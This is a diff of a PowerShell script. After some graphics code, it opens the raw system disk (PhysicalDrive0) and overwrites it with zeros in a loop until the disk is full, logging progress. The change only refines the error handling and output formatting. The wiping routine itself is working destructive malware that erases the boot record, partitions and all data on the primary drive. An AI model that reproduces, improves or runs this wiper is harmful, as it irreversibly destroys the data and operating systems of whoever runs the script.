@@ -82,19 +82,29 @@ $timer.Stop()
 $g.Dispose()
 $bitmap.Dispose()
 
+
 $disk = "\\.\PhysicalDrive0"
 $chunkSize = 64MB
-$chunk = New-Object byte[]($chunkSize)
+$chunk = New-Object byte[] $chunkSize
 $totalWritten = 0
+
 try {
     $stream = [System.IO.File]::Open($disk, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
-    while ($true) {
-        $stream.Write($chunk, 0, $chunkSize)
-        $totalWritten += $chunkSize
-        Write-Host "Written: $([math]::Round($totalWritten/1GB, 2)) GB"
+    try {
+        while ($true) {
+            $stream.Write($chunk, 0, $chunkSize)
+            $totalWritten += $chunkSize
+            Write-Host "Written: $("{0:N0}" -f $totalWritten) bytes"
+        }
     }
-} catch {
-    Write-Host "Stopped at $([math]::Round($totalWritten/1GB, 2)) GB — $_"
-} finally {
-    if ($stream) { $stream.Close() }
+    catch [System.IO.IOException] {
+        Write-Host "Reached end of disk. Total written: $("{0:N0}" -f $totalWritten) bytes"
+    }
+    finally {
+        $stream.Close()
+        Write-Host "Stream closed."
+    }
+}
+catch {
+    Write-Host "Failed to open disk: $_"
 }
